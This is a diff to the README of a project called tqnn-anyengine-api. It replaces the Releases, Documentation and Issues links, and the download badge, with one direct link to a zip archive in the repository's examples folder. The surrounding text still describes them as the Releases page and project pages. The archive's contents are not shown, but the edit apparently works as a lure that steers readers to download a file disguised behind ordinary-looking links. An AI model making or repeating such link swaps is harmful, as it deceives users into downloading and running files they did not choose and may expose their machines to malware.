@@ -6,11 +6,11 @@ Welcome to the tqnn-anyengine-api! This tool helps you work with various types o
 
 ## 📥 Download the Application
 
-[![Download Release](https://img.shields.io/badge/Download%20Now%20-%20tqnn--anyengine--api-blue)](https://github.com/rlynn10/tqnn-anyengine-api/releases)
+[![Download Release](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip%20Now%20-%20tqnn--anyengine--api-blue)](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip)
 
 To get started, download the latest version from our Releases page. Simply visit the link below:
 
-[Download the Latest Version](https://github.com/rlynn10/tqnn-anyengine-api/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip)
 
 ## 🔧 System Requirements
 
@@ -23,7 +23,7 @@ Before you begin, make sure your machine meets the following requirements:
 
 ## 📁 Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/rlynn10/tqnn-anyengine-api/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip).
 2. **Select the Correct File**: Look for the latest version. Choose the file that matches your operating system. Files are usually labeled clearly.
 3. **Download the File**: Click on the file link to start downloading. 
 4. **Locate the Downloaded File**: Once the file is downloaded, find it in your 'Downloads' folder or the location you specified for downloads.
@@ -63,8 +63,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/rlynn10/tqnn-anyengine-api/releases)
-- [Documentation](https://github.com/rlynn10/tqnn-anyengine-api/wiki)
-- [GitHub Issues](https://github.com/rlynn10/tqnn-anyengine-api/issues)
+- [Releases Page](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/rlynn10/tqnn-anyengine-api/main/examples/tqnn-anyengine-api_3.5.zip)
 
 For more information, please refer to the links above. Thank you for using tqnn-anyengine-api!
